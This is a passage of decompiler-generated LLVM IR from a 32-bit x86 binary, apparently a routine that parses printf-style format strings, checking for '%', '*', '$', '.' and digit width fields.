  %v1_80514ce = and i32 %v3_80514cb, 128
  %v2_80514ce = icmp eq i32 %v1_80514ce, 0
  store i32 %v1_80514ce, i32* %edi.global-to-local, align 4
  %v1_80514d4 = icmp eq i1 %v2_80514ce, false
  br i1 %v1_80514d4, label %dec_label_pc_80514e7, label %dec_label_pc_80514d6

dec_label_pc_80514d6:                             ; preds = %entry
  %v2_80514d6 = load i32, i32* %arg1, align 4
  br label %dec_label_pc_8051534.outer

dec_label_pc_80514e1:                             ; preds = %dec_label_pc_805166f
  %v1_80514e1 = add i32 %v0_805166f.pre.pre, 1
  store i32 %v1_80514e1, i32* @esi, align 4
  br label %dec_label_pc_805167f

dec_label_pc_80514e7:                             ; preds = %entry
  %v15_8051499 = ptrtoint i32* %stack_var_-108 to i32
  store i32 0, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80514e9

dec_label_pc_80514e9:                             ; preds = %dec_label_pc_8051511.dec_label_pc_80514e9_crit_edge, %dec_label_pc_80514e7
  %v2_80514fa = phi i32 [ %v2_80514fa.pre, %dec_label_pc_8051511.dec_label_pc_80514e9_crit_edge ], [ %v15_8051499, %dec_label_pc_80514e7 ]
  %v3_80514fa = phi i32 [ %v1_8051511, %dec_label_pc_8051511.dec_label_pc_80514e9_crit_edge ], [ 0, %dec_label_pc_80514e7 ]
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  %v1_80514ed = mul i32 %v3_80514fa, 4
  store i32 %v1_80514ed, i32* @ecx, align 4
  %v2_80514f4 = load i32, i32* %arg1, align 4
  store i32 %v2_80514f4, i32* @edx, align 4
  %v2_80514f6 = add i32 %v1_80514ed, -4
  %v3_80514f6 = add i32 %v2_80514f6, %v2_80514f4
  %v4_80514f6 = inttoptr i32 %v3_80514f6 to i32*
  %v5_80514f6 = load i32, i32* %v4_80514f6, align 4
  store i32 %v5_80514f6, i32* %eax.global-to-local, align 4
  %v1_80514fa = trunc i32 %v5_80514f6 to i8
  %v4_80514fa = add i32 %v2_80514fa, 36
  %v5_80514fa = add i32 %v4_80514fa, %v3_80514fa
  %v6_80514fa = inttoptr i32 %v5_80514fa to i8*
  store i8 %v1_80514fa, i8* %v6_80514fa, align 1
  %v0_80514fe = load i32, i32* %eax.global-to-local, align 4
  %v1_80514fe = urem i32 %v0_80514fe, 256
  %v2_80514fe = load i32, i32* @ebx, align 4
  %v3_80514fe = and i32 %v2_80514fe, -256
  %v4_80514fe = or i32 %v3_80514fe, %v1_80514fe
  store i32 %v4_80514fe, i32* @ebx, align 4
  %v1_8051500 = mul i32 %v0_80514fe, 16777216
  %v2_8051500 = sdiv i32 %v1_8051500, 16777216
  store i32 %v2_8051500, i32* %eax.global-to-local, align 4
  %v1_8051503 = load i32, i32* @edx, align 4
  %v2_8051503 = load i32, i32* @ecx, align 4
  %v3_8051503 = add i32 %v1_8051503, -4
  %v4_8051503 = add i32 %v3_8051503, %v2_8051503
  %v5_8051503 = inttoptr i32 %v4_8051503 to i32*
  %v6_8051503 = load i32, i32* %v5_8051503, align 4
  %v17_8051503 = icmp eq i32 %v2_8051500, %v6_8051503
  %v1_8051507 = icmp eq i1 %v17_8051503, false
  br i1 %v1_8051507, label %dec_label_pc_8051859, label %dec_label_pc_805150d

dec_label_pc_805150d:                             ; preds = %dec_label_pc_80514e9
  %v3_805150d = trunc i32 %v0_80514fe to i8
  %v4_805150d = icmp eq i8 %v3_805150d, 0
  br i1 %v4_805150d, label %dec_label_pc_8051517, label %dec_label_pc_8051511

dec_label_pc_8051511:                             ; preds = %dec_label_pc_805150d
  %v0_8051511 = load i32, i32* %esi.global-to-local, align 4
  %v1_8051511 = add i32 %v0_8051511, 1
  store i32 %v1_8051511, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8051511, 32
  br i1 %tmp, label %dec_label_pc_8051511.dec_label_pc_80514e9_crit_edge, label %dec_label_pc_8051517

dec_label_pc_8051511.dec_label_pc_80514e9_crit_edge: ; preds = %dec_label_pc_8051511
  %v2_80514fa.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80514e9

dec_label_pc_8051517:                             ; preds = %dec_label_pc_8051511, %dec_label_pc_805150d
  %v2_805151c = ptrtoint i32* %stack_var_-71 to i32
  br label %dec_label_pc_8051534.outer

dec_label_pc_8051534.outer:                       ; preds = %dec_label_pc_8051517, %dec_label_pc_80514d6, %dec_label_pc_8051651
  %v0_8051540.ph94 = phi i32 [ %v1_8051651, %dec_label_pc_8051651 ], [ %v2_80514d6, %dec_label_pc_80514d6 ], [ %v2_805151c, %dec_label_pc_8051517 ]
  %stack_var_-32.1.ph = phi i32 [ %stack_var_-32.3, %dec_label_pc_8051651 ], [ %tmp66, %dec_label_pc_80514d6 ], [ %tmp66, %dec_label_pc_8051517 ]
  %stack_var_-96.1.ph = phi i32 [ %v0_80514da, %dec_label_pc_8051651 ], [ 0, %dec_label_pc_80514d6 ], [ 0, %dec_label_pc_8051517 ]
  %stack_var_-88.1.ph = phi i32 [ %stack_var_-88.3, %dec_label_pc_8051651 ], [ %v3_80514c4, %dec_label_pc_80514d6 ], [ %v3_80514c4, %dec_label_pc_8051517 ]
  %stack_var_-92.1.ph = phi i64 [ -1, %dec_label_pc_8051651 ], [ 0, %dec_label_pc_80514d6 ], [ 0, %dec_label_pc_8051517 ]
  %v7_805153b = mul nsw i64 %stack_var_-92.1.ph, -4
  %v8_805153b = trunc i64 %v7_805153b to i32
  %v2_8051543 = add i32 %v8_805153b, 80
  br label %dec_label_pc_8051534

dec_label_pc_8051534:                             ; preds = %dec_label_pc_8051534.outer, %dec_label_pc_80515f1
  %v0_8051540 = phi i32 [ %v0_80515fe, %dec_label_pc_80515f1 ], [ %v0_8051540.ph94, %dec_label_pc_8051534.outer ]
  %stack_var_-32.1 = phi i32 [ %stack_var_-32.2, %dec_label_pc_80515f1 ], [ %stack_var_-32.1.ph, %dec_label_pc_8051534.outer ]
  %stack_var_-88.1 = phi i32 [ %stack_var_-88.2, %dec_label_pc_80515f1 ], [ %stack_var_-88.1.ph, %dec_label_pc_8051534.outer ]
  store i32 %v0_8051540, i32* @edx, align 4
  %v1_8051534 = inttoptr i32 %v0_8051540 to i8*
  %v2_8051534 = load i8, i8* %v1_8051534, align 1
  %v11_8051534 = icmp eq i8 %v2_8051534, 42
  store i32 %v0_8051540, i32* @esi, align 4
  %v1_8051539 = icmp eq i1 %v11_8051534, false
  br i1 %v1_8051539, label %dec_label_pc_805154b, label %dec_label_pc_805153b

dec_label_pc_805153b:                             ; preds = %dec_label_pc_8051534
  store i32 %v8_805153b, i32* %eax.global-to-local, align 4
  %v1_8051540 = add i32 %v0_8051540, 1
  store i32 %v1_8051540, i32* @esi, align 4
  %v0_8051543 = load i32, i32* @esp, align 4
  %v3_8051543 = add i32 %v2_8051543, %v0_8051543
  %v4_8051543 = inttoptr i32 %v3_8051543 to i32*
  store i32 0, i32* %v4_8051543, align 4
  %v0_8051565.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805154b

dec_label_pc_805154b:                             ; preds = %dec_label_pc_8051534, %dec_label_pc_805153b
  %v0_8051565.pre = phi i32 [ %v0_8051540, %dec_label_pc_8051534 ], [ %v0_8051565.pre.pre, %dec_label_pc_805153b ]
  %v0_805154b = load i32, i32* @global_var_80622cc, align 4
  store i32 %v0_805154b, i32* %ebp.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v4_8051565.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051565

dec_label_pc_8051555:                             ; preds = %dec_label_pc_8051565
  %v1_8051555 = add i32 %v1_805155d, -4094
  %v6_8051555 = sub i32 4093, %v1_805155d
  %v7_8051555 = and i32 %v6_8051555, %v1_805155d
  %v8_8051555 = icmp slt i32 %v7_8051555, 0
  %v9_8051555 = icmp eq i32 %v1_8051555, 0
  %v10_8051555 = icmp slt i32 %v1_8051555, 0
  %v3_805155b = icmp eq i1 %v10_8051555, %v8_8051555
  %v4_805155b = icmp eq i1 %v9_8051555, false
  %v5_805155b = and i1 %v4_805155b, %v3_805155b
  br i1 %v5_805155b, label %dec_label_pc_8051564, label %dec_label_pc_805155d

dec_label_pc_805155d:                             ; preds = %dec_label_pc_8051555
  %v3_805155d = mul i32 %v1_805155d, 10
  store i32 %v3_805155d, i32* %eax.global-to-local, align 4
  %v2_8051560 = add i32 %v3_805155d, -48
  %v3_8051560 = add i32 %v2_8051560, %v2_8051567
  store i32 %v3_8051560, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051564

dec_label_pc_8051564:                             ; preds = %dec_label_pc_8051555, %dec_label_pc_805155d
  %v0_805157f32 = phi i32 [ %v1_805155d, %dec_label_pc_8051555 ], [ %v3_8051560, %dec_label_pc_805155d ]
  %v4_805156528 = phi i32 [ %v6_8051565, %dec_label_pc_8051555 ], [ %v3_805155d, %dec_label_pc_805155d ]
  %v1_8051564 = add i32 %v0_8051564, 1
  store i32 %v1_8051564, i32* @esi, align 4
  br label %dec_label_pc_8051565

dec_label_pc_8051565:                             ; preds = %dec_label_pc_805154b, %dec_label_pc_8051564
  %v1_805155d = phi i32 [ 0, %dec_label_pc_805154b ], [ %v0_805157f32, %dec_label_pc_8051564 ]
  %v4_8051565 = phi i32 [ %v4_8051565.pre, %dec_label_pc_805154b ], [ %v4_805156528, %dec_label_pc_8051564 ]
  %v0_8051564 = phi i32 [ %v0_8051565.pre, %dec_label_pc_805154b ], [ %v1_8051564, %dec_label_pc_8051564 ]
  %v1_8051565 = inttoptr i32 %v0_8051564 to i8*
  %v2_8051565 = load i8, i8* %v1_8051565, align 1
  %v3_8051565 = zext i8 %v2_8051565 to i32
  %v5_8051565 = and i32 %v4_8051565, -256
  %v6_8051565 = or i32 %v3_8051565, %v5_8051565
  store i32 %v6_8051565, i32* %eax.global-to-local, align 4
  %v2_8051567 = sext i8 %v2_8051565 to i32
  store i32 %v2_8051567, i32* @ecx, align 4
  %v2_805156a = mul nsw i32 %v2_8051567, 2
  %v3_805156a = add i32 %v2_805156a, %v0_805154b
  %v4_805156a = inttoptr i32 %v3_805156a to i8*
  %v5_805156a = load i8, i8* %v4_805156a, align 1
  %v6_805156a = and i8 %v5_805156a, 8
  %v7_805156a = icmp eq i8 %v6_805156a, 0
  %v1_805156f = icmp eq i1 %v7_805156a, false
  br i1 %v1_805156f, label %dec_label_pc_8051555, label %dec_label_pc_8051571

dec_label_pc_8051571:                             ; preds = %dec_label_pc_8051565
  %v0_8051571 = load i32, i32* @edx, align 4
  %v1_8051571 = add i32 %v0_8051571, -1
  %v2_8051571 = inttoptr i32 %v1_8051571 to i8*
  %v3_8051571 = load i8, i8* %v2_8051571, align 1
  %v12_8051571 = icmp eq i8 %v3_8051571, 37
  %v1_8051575 = icmp eq i1 %v12_8051571, false
  br i1 %v1_8051575, label %dec_label_pc_8051608, label %dec_label_pc_805157b

dec_label_pc_805157b:                             ; preds = %dec_label_pc_8051571
  %v10_805157b = icmp eq i8 %v2_8051565, 36
  %v1_805157d = icmp eq i1 %v10_805157b, false
  br i1 %v1_805157d, label %dec_label_pc_80515af, label %dec_label_pc_805157f

dec_label_pc_805157f:                             ; preds = %dec_label_pc_805157b
  %tmp89 = icmp slt i32 %v1_805155d, 1
  br i1 %tmp89, label %dec_label_pc_80515af, label %dec_label_pc_8051583

dec_label_pc_8051583:                             ; preds = %dec_label_pc_805157f
  %v4_8051583 = icmp eq i32 %stack_var_-88.1, 0
  %v1_8051588 = add i32 %v0_8051564, 1
  store i32 %v1_8051588, i32* @edx, align 4
  br i1 %v4_8051583, label %dec_label_pc_8051859, label %dec_label_pc_8051591

dec_label_pc_8051591:                             ; preds = %dec_label_pc_8051583
  store i32 %stack_var_-88.1, i32* %ecx.global-to-local, align 4
  %v2_8051599 = sub i32 %v1_805155d, %stack_var_-88.1
  %v8_8051599 = xor i32 %v1_805155d, %stack_var_-88.1
  %v9_8051599 = xor i32 %v2_8051599, %v1_805155d
  %v10_8051599 = and i32 %v9_8051599, %v8_8051599
  %v11_8051599 = icmp slt i32 %v10_8051599, 0
  %v12_8051599 = icmp eq i32 %v2_8051599, 0
  %v13_8051599 = icmp slt i32 %v2_8051599, 0
  %v3_805159b = icmp ne i1 %v13_8051599, %v11_8051599
  %v4_805159b = or i1 %v12_8051599, %v3_805159b
  %stack_var_-88.1.v0_805159d = select i1 %v4_805159b, i32 %stack_var_-88.1, i32 %v1_805155d
  br label %dec_label_pc_80515ab

dec_label_pc_80515ab:                             ; preds = %dec_label_pc_80515bf, %dec_label_pc_8051591, %dec_label_pc_80515c3
  %v0_80515ab = phi i32 [ %v1_8051588, %dec_label_pc_8051591 ], [ %v0_8051571, %dec_label_pc_80515c3 ], [ %v0_8051571, %dec_label_pc_80515bf ]
  %stack_var_-32.2 = phi i32 [ %v1_805155d, %dec_label_pc_8051591 ], [ %stack_var_-32.1, %dec_label_pc_80515c3 ], [ %stack_var_-32.1, %dec_label_pc_80515bf ]
  %stack_var_-88.2 = phi i32 [ %stack_var_-88.1.v0_805159d, %dec_label_pc_8051591 ], [ 0, %dec_label_pc_80515c3 ], [ 0, %dec_label_pc_80515bf ]
  store i32 %v0_80515ab, i32* @esi, align 4
  br label %dec_label_pc_80515d2

dec_label_pc_80515af:                             ; preds = %dec_label_pc_805157f, %dec_label_pc_805157b
  %tmp90 = icmp slt i32 %stack_var_-88.1, 1
  br i1 %tmp90, label %dec_label_pc_80515bf, label %dec_label_pc_80515b6

dec_label_pc_80515b6:                             ; preds = %dec_label_pc_80515af
  %v10_80515b6 = icmp eq i8 %v2_8051565, 109
  br i1 %v10_80515b6, label %dec_label_pc_8051608, label %dec_label_pc_8051859

dec_label_pc_80515bf:                             ; preds = %dec_label_pc_80515af
  %tmp153 = icmp ugt i32 %v0_8051564, %v0_8051571
  br i1 %tmp153, label %dec_label_pc_80515c3, label %dec_label_pc_80515ab

dec_label_pc_80515c3:                             ; preds = %dec_label_pc_80515bf
  %v1_80515c3 = inttoptr i32 %v0_8051571 to i8*
  %v2_80515c3 = load i8, i8* %v1_80515c3, align 1
  %v8_80515c3 = icmp eq i8 %v2_80515c3, 48
  br i1 %v8_80515c3, label %dec_label_pc_80515ab, label %dec_label_pc_8051608

dec_label_pc_80515d2:                             ; preds = %dec_label_pc_80515e3, %dec_label_pc_80515ab
  %v0_80515fe = phi i32 [ %v1_80515e3, %dec_label_pc_80515e3 ], [ %v0_80515ab, %dec_label_pc_80515ab ]
  %v4_80515dc35 = phi i32 [ %v6_80515dc, %dec_label_pc_80515e3 ], [ %v6_8051565, %dec_label_pc_80515ab ]
  store i32 ptrtoint ([8 x i8]* @global_var_806050a.713 to i32), i32* %edx.global-to-local, align 4
  %v1_80515df = inttoptr i32 %v0_80515fe to i8*
  br label %dec_label_pc_80515dc

dec_label_pc_80515dc:                             ; preds = %dec_label_pc_80515ed, %dec_label_pc_80515d2
  %v4_80515dc = phi i32 [ %v4_80515dc35, %dec_label_pc_80515d2 ], [ %v6_80515dc, %dec_label_pc_80515ed ]
  %v0_80515de = phi i32 [ ptrtoint ([8 x i8]* @global_var_806050a.713 to i32), %dec_label_pc_80515d2 ], [ %v1_80515de, %dec_label_pc_80515ed ]
  %v0_80515ed = phi i32 [ 1, %dec_label_pc_80515d2 ], [ %v2_80515ed, %dec_label_pc_80515ed ]
  store i32 %v0_80515ed, i32* @ecx, align 4
  %v1_80515dc = inttoptr i32 %v0_80515de to i8*
  %v2_80515dc = load i8, i8* %v1_80515dc, align 1
  %v3_80515dc = zext i8 %v2_80515dc to i32
  %v5_80515dc = and i32 %v4_80515dc, -256
  %v6_80515dc = or i32 %v3_80515dc, %v5_80515dc
  store i32 %v6_80515dc, i32* %eax.global-to-local, align 4
  %v1_80515de = add i32 %v0_80515de, 1
  store i32 %v1_80515de, i32* @edx, align 4
  %v2_80515df = load i8, i8* %v1_80515df, align 1
  %v15_80515df = icmp eq i8 %v2_80515df, %v2_80515dc
  %v1_80515e1 = icmp eq i1 %v15_80515df, false
  br i1 %v1_80515e1, label %dec_label_pc_80515e8, label %dec_label_pc_80515e3

dec_label_pc_80515e3:                             ; preds = %dec_label_pc_80515dc
  %v1_80515e3 = add i32 %v0_80515fe, 1
  store i32 %v1_80515e3, i32* @esi, align 4
  %v0_80515e4 = load i32, i32* %edi.global-to-local, align 4
  %v2_80515e4 = or i32 %v0_80515e4, %v0_80515ed
  store i32 %v2_80515e4, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_80515d2

dec_label_pc_80515e8:                             ; preds = %dec_label_pc_80515dc
  %v1_80515e8 = inttoptr i32 %v1_80515de to i8*
  %v2_80515e8 = load i8, i8* %v1_80515e8, align 1
  %v3_80515e8 = icmp eq i8 %v2_80515e8, 0
  br i1 %v3_80515e8, label %dec_label_pc_80515f1, label %dec_label_pc_80515ed

dec_label_pc_80515ed:                             ; preds = %dec_label_pc_80515e8
  %v2_80515ed = mul i32 %v0_80515ed, 2
  br label %dec_label_pc_80515dc

dec_label_pc_80515f1:                             ; preds = %dec_label_pc_80515e8
  %v0_80515f1 = load i32, i32* %edi.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_80515f5 = udiv i32 %v0_80515f1, 2
  %v1_80515f5.not = or i32 %v1_80515f5, -6
  %v1_80515fa = xor i32 %v1_80515f5.not, 5
  store i32 %v1_80515fa, i32* %eax.global-to-local, align 4
  %v2_80515fc = and i32 %v1_80515fa, %v0_80515f1
  store i32 %v2_80515fc, i32* %edi.global-to-local, align 4
  %v1_80515fe = add i32 %v0_80515fe, -1
  %v2_80515fe = inttoptr i32 %v1_80515fe to i8*
  %v3_80515fe = load i8, i8* %v2_80515fe, align 1
  %v12_80515fe = icmp eq i8 %v3_80515fe, 37
  %v1_8051602 = icmp eq i1 %v12_80515fe, false
  br i1 %v1_8051602, label %dec_label_pc_8051534, label %dec_label_pc_8051608

dec_label_pc_8051608:                             ; preds = %dec_label_pc_80515c3, %dec_label_pc_80515f1, %dec_label_pc_8051571, %dec_label_pc_80515b6
  %v0_805162b = phi i32 [ %v1_805155d, %dec_label_pc_80515b6 ], [ %v1_805155d, %dec_label_pc_80515c3 ], [ 0, %dec_label_pc_80515f1 ], [ %v1_805155d, %dec_label_pc_8051571 ]
  %v1_8051634 = phi i32 [ %v0_8051564, %dec_label_pc_80515b6 ], [ %v0_8051564, %dec_label_pc_80515c3 ], [ %v0_80515fe, %dec_label_pc_80515f1 ], [ %v0_8051564, %dec_label_pc_8051571 ]
  %v0_8051631 = phi i32 [ %v0_8051571, %dec_label_pc_80515b6 ], [ %v0_8051571, %dec_label_pc_80515c3 ], [ %v1_80515de, %dec_label_pc_80515f1 ], [ %v0_8051571, %dec_label_pc_8051571 ]
  %stack_var_-32.3 = phi i32 [ %stack_var_-32.1, %dec_label_pc_80515b6 ], [ %stack_var_-32.1, %dec_label_pc_80515c3 ], [ %stack_var_-32.2, %dec_label_pc_80515f1 ], [ %stack_var_-32.1, %dec_label_pc_8051571 ]
  %stack_var_-88.3 = phi i32 [ %stack_var_-88.1, %dec_label_pc_80515b6 ], [ 0, %dec_label_pc_80515c3 ], [ %stack_var_-88.2, %dec_label_pc_80515f1 ], [ %stack_var_-88.1, %dec_label_pc_8051571 ]
  %v1_8051608 = inttoptr i32 %v0_8051631 to i8*
  %v2_8051608 = load i8, i8* %v1_8051608, align 1
  %v11_8051608 = icmp eq i8 %v2_8051608, 42
  %v1_805160b = icmp eq i1 %v11_8051608, false
  br i1 %v1_805160b, label %dec_label_pc_8051641, label %dec_label_pc_805160d

dec_label_pc_805160d:                             ; preds = %dec_label_pc_8051608
  %v4_805160d = icmp eq i32 %stack_var_-88.3, 0
  br i1 %v4_805160d, label %dec_label_pc_8051631, label %dec_label_pc_8051614

dec_label_pc_8051614:                             ; preds = %dec_label_pc_805160d
  %v1_8051614 = inttoptr i32 %v1_8051634 to i8*
  %v2_8051614 = load i8, i8* %v1_8051614, align 1
  %v11_8051614 = icmp eq i8 %v2_8051614, 36
  %v1_8051617 = icmp eq i1 %v11_8051614, false
  br i1 %v1_8051617, label %dec_label_pc_8051859, label %dec_label_pc_805161d

dec_label_pc_805161d:                             ; preds = %dec_label_pc_8051614
  %tmp91 = icmp slt i32 %v0_805162b, 1
  br i1 %tmp91, label %dec_label_pc_8051859, label %dec_label_pc_8051625

dec_label_pc_8051625:                             ; preds = %dec_label_pc_805161d
  store i32 %v8_805153b, i32* %eax.global-to-local, align 4
  %v1_805162a = add i32 %v1_8051634, 1
  store i32 %v1_805162a, i32* @esi, align 4
  %v1_805162b = load i32, i32* @esp, align 4
  %v3_805162b = add i32 %v8_805153b, 68
  %v4_805162b = add i32 %v3_805162b, %v1_805162b
  %v5_805162b = inttoptr i32 %v4_805162b to i32*
  store i32 %v0_805162b, i32* %v5_805162b, align 4
  %v0_805166f.pre.pre.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805163c

dec_label_pc_8051631:                             ; preds = %dec_label_pc_805160d
  %v1_8051631 = add i32 %v0_8051631, 1
  store i32 %v1_8051631, i32* %eax.global-to-local, align 4
  %v12_8051634 = icmp eq i32 %v1_8051631, %v1_8051634
  %v1_8051636 = icmp eq i1 %v12_8051634, false
  br i1 %v1_8051636, label %dec_label_pc_8051859, label %dec_label_pc_805163c

dec_label_pc_805163c:                             ; preds = %dec_label_pc_8051631, %dec_label_pc_8051625
  %v0_805166f.pre.pre.pre = phi i32 [ %v1_8051634, %dec_label_pc_8051631 ], [ %v0_805166f.pre.pre.pre.pre, %dec_label_pc_8051625 ]
  store i32 -2147483648, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051641

dec_label_pc_8051641:                             ; preds = %dec_label_pc_8051608, %dec_label_pc_805163c
  %v0_805166f.pre.pre = phi i32 [ %v1_8051634, %dec_label_pc_8051608 ], [ %v0_805166f.pre.pre.pre, %dec_label_pc_805163c ]
  %v0_80514da = phi i32 [ %v0_805162b, %dec_label_pc_8051608 ], [ -2147483648, %dec_label_pc_805163c ]
  %v4_8051641 = trunc i64 %stack_var_-92.1.ph to i32
  %v5_8051641 = icmp eq i32 %v4_8051641, 0
  %v1_8051646 = icmp eq i1 %v5_8051641, false
  %.pre = inttoptr i32 %v0_805166f.pre.pre to i8*
  br i1 %v1_8051646, label %dec_label_pc_805166a, label %dec_label_pc_805164c

dec_label_pc_805164c:                             ; preds = %dec_label_pc_8051641
  %v2_805164c = load i8, i8* %.pre, align 1
  %v11_805164c = icmp eq i8 %v2_805164c, 46
  %v1_805164f = icmp eq i1 %v11_805164c, false
  br i1 %v1_805164f, label %dec_label_pc_8051663, label %dec_label_pc_8051651

dec_label_pc_8051651:                             ; preds = %dec_label_pc_805164c
  %v1_8051651 = add i32 %v0_805166f.pre.pre, 1
  store i32 %v1_8051651, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8051534.outer

dec_label_pc_8051663:                             ; preds = %dec_label_pc_805164c
  br label %dec_label_pc_805166a

dec_label_pc_805166a:                             ; preds = %dec_label_pc_8051641, %dec_label_pc_8051663
  %stack_var_-96.2 = phi i32 [ %v0_80514da, %dec_label_pc_8051663 ], [ %stack_var_-96.1.ph, %dec_label_pc_8051641 ]
  %storemerge4 = phi i32 [ -1, %dec_label_pc_8051663 ], [ %v0_80514da, %dec_label_pc_8051641 ]
  store i32 %storemerge4, i32* %ebp.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_80604b8.714 to i32), i32* @edx, align 4
  %v4_805166f.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805166f

dec_label_pc_805166f:                             ; preds = %dec_label_pc_8051679, %dec_label_pc_805166a
  %v0_8051679 = phi i32 [ %v1_8051679, %dec_label_pc_8051679 ], [ ptrtoint ([9 x i8]* @global_var_80604b8.714 to i32), %dec_label_pc_805166a ]
  %v4_805166f = phi i32 [ %v6_805166f, %dec_label_pc_8051679 ], [ %v4_805166f.pre, %dec_label_pc_805166a ]
  %v2_805166f = load i8, i8* %.pre, align 1
  %v3_805166f = zext i8 %v2_805166f to i32
  %v5_805166f = and i32 %v4_805166f, -256
  %v6_805166f = or i32 %v3_805166f, %v5_805166f
  store i32 %v6_805166f, i32* %eax.global-to-local, align 4
  %v3_8051671 = inttoptr i32 %v0_8051679 to i8*
  %v4_8051671 = load i8, i8* %v3_8051671, align 1
  %v15_8051671 = icmp eq i8 %v2_805166f, %v4_8051671
  br i1 %v15_8051671, label %dec_label_pc_80514e1, label %dec_label_pc_8051679

dec_label_pc_8051679:                             ; preds = %dec_label_pc_805166f
  %v1_8051679 = add i32 %v0_8051679, 1
  store i32 %v1_8051679, i32* @edx, align 4
  %v1_805167a = inttoptr i32 %v1_8051679 to i8*
  %v2_805167a = load i8, i8* %v1_805167a, align 1
  %v3_805167a = icmp eq i8 %v2_805167a, 0
  %v1_805167d = icmp eq i1 %v3_805167a, false
  br i1 %v1_805167d, label %dec_label_pc_805166f, label %dec_label_pc_805167f

dec_label_pc_805167f:                             ; preds = %dec_label_pc_8051679, %dec_label_pc_80514e1
  %v0_8051692 = phi i32 [ %v1_80514e1, %dec_label_pc_80514e1 ], [ %v0_805166f.pre.pre, %dec_label_pc_8051679 ]
  %v0_805168f = phi i32 [ %v0_8051679, %dec_label_pc_80514e1 ], [ %v1_8051679, %dec_label_pc_8051679 ]
  %v1_8051681 = add i32 %v0_805168f, -134612152
  %v1_8051686 = add i32 %v0_805168f, -134612153
  %v5_8051686 = sub i32 134612152, %v0_805168f
  %v6_8051686 = and i32 %v1_8051681, %v5_8051686
  %v7_8051686 = icmp slt i32 %v6_8051686, 0
  %v8_8051686 = icmp eq i32 %v1_8051686, 0
  %v9_8051686 = icmp slt i32 %v1_8051686, 0
  store i32 %v1_8051686, i32* %eax.global-to-local, align 4
  %v3_8051687 = icmp eq i1 %v9_8051686, %v7_8051686
  %v4_8051687 = icmp eq i1 %v8_8051686, false
  %v5_8051687 = and i1 %v4_8051687, %v3_8051687
  br i1 %v5_8051687, label %dec_label_pc_8051693, label %dec_label_pc_8051689

dec_label_pc_8051689:                             ; preds = %dec_label_pc_805167f
  %v1_8051689 = inttoptr i32 %v0_8051692 to i8*
  %v2_8051689 = load i8, i8* %v1_8051689, align 1
  %v3_8051689 = zext i8 %v2_8051689 to i32
  %v5_8051689 = and i32 %v1_8051686, -256
  %v6_8051689 = or i32 %v3_8051689, %v5_8051689
  store i32 %v6_8051689, i32* %eax.global-to-local, align 4
  %v3_805168b = inttoptr i32 %v0_805168f to i8*
  %v4_805168b = load i8, i8* %v3_805168b, align 1
  %v15_805168b = icmp eq i8 %v2_8051689, %v4_805168b
  %v1_805168d = icmp eq i1 %v15_805168b, false
  br i1 %v1_805168d, label %dec_label_pc_8051693, label %dec_label_pc_805168f

dec_label_pc_805168f:                             ; preds = %dec_label_pc_8051689
  %v1_805168f = add i32 %v0_805168f, 9
  store i32 %v1_805168f, i32* @edx, align 4
  %v1_8051692 = add i32 %v0_8051692, 1
  store i32 %v1_8051692, i32* @esi, align 4
  br label %dec_label_pc_8051693

dec_label_pc_8051693:                             ; preds = %dec_label_pc_8051689, %dec_label_pc_805167f, %dec_label_pc_805168f
  %v4_8051697 = phi i32 [ %v6_8051689, %dec_label_pc_8051689 ], [ %v1_8051686, %dec_label_pc_805167f ], [ %v6_8051689, %dec_label_pc_805168f ]
  %v0_8051697 = phi i32 [ %v0_8051692, %dec_label_pc_8051689 ], [ %v0_8051692, %dec_label_pc_805167f ], [ %v1_8051692, %dec_label_pc_805168f ]
  %v0_8051693 = phi i32 [ %v0_805168f, %dec_label_pc_8051689 ], [ %v0_805168f, %dec_label_pc_805167f ], [ %v1_805168f, %dec_label_pc_805168f ]
  %v1_8051693 = add i32 %v0_8051693, 9
  %v2_8051693 = inttoptr i32 %v1_8051693 to i8*
  %v3_8051693 = load i8, i8* %v2_8051693, align 1
  %v4_8051693 = sext i8 %v3_8051693 to i32
  store i32 %v4_8051693, i32* %ebx.global-to-local, align 4
  %v1_8051697 = inttoptr i32 %v0_8051697 to i8*
  %v2_8051697 = load i8, i8* %v1_8051697, align 1
  %v3_8051697 = zext i8 %v2_8051697 to i32
  %v5_8051697 = and i32 %v4_8051697, -256
  %v6_8051697 = or i32 %v3_8051697, %v5_8051697
  store i32 %v6_8051697, i32* %eax.global-to-local, align 4
  %v2_8051699 = mul nsw i32 %v4_8051693, 256
  store i32 %v2_8051699, i32* %ebx.global-to-local, align 4
  %v4_805169c = icmp eq i8 %v2_8051697, 0
  br i1 %v4_805169c, label %dec_label_pc_8051859, label %dec_label_pc_80516a4

dec_label_pc_80516a4:                             ; preds = %dec_label_pc_8051693
  %v3_80516a4 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_80516a4, i32* %edx.global-to-local, align 4
  store i32 ptrtoint ([21 x i8]* @global_var_80604f5.715 to i32), i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80516ad

dec_label_pc_80516ad:                             ; preds = %dec_label_pc_80516fd, %dec_label_pc_80516a4
  %v0_80516fd = phi i32 [ %v1_80516fd, %dec_label_pc_80516fd ], [ ptrtoint ([21 x i8]* @global_var_80604f5.715 to i32), %dec_label_pc_80516a4 ]
  %v3_80516ad = inttoptr i32 %v0_80516fd to i8*
  %v4_80516ad = load i8, i8* %v3_80516ad, align 1
  %v15_80516ad = icmp eq i8 %v2_8051697, %v4_80516ad
  %v1_80516af = icmp eq i1 %v15_80516ad, false
  br i1 %v1_80516af, label %dec_label_pc_80516fd, label %dec_label_pc_80516b1

dec_label_pc_80516b1:                             ; preds = %dec_label_pc_80516ad
  %v1_80516b3 = add i32 %v0_80516fd, -134612213
  store i32 %v1_80516b3, i32* %edx.global-to-local, align 4
